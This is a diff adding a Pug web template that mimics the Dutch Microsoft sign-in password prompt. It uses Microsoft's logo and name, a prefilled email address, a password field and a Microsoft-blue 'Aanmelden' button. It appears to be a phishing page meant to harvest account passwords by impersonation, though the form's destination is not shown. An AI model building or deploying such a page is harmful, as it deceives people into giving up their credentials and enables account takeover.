@@ -1,0 +1,25 @@
+extends layout
+
+block content
+    .container
+        #form.w-100.d-flex.justify-content-center.align-items-center
+            form.col-12.shadow-lg.p-4.mb-5.bg-body.rounded
+                .d-grid.gap-4
+                    .d-flex
+                        img(src='MS%20Logo.jpg', style='height: 2.5rem; ', alt='Microsoft Logo')
+                        h2#microsoft.px-2 Microsoft
+                    #example.p bomo2@hotmail.nl
+                #signin.h1 Wachtwoord invoern
+                .form-group
+                    label(for='password')
+                    input#password(type='password', placeholder='Wachtwoord')
+                .d-grid.gap-5
+                    a#forgot.link-primary(href='#') Wachtwoord vergeten?
+                    .d-flex.flex-row.justify-content-end
+                        button#login.btn.btn-primary(type='submit', name='login', style='background-color: #0864b4') Aanmelden
+                    br
+                .row.py-3
+                    .col-md-12
+                        .form-group
+                            h2.py-0.text-center
+    script(src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js')
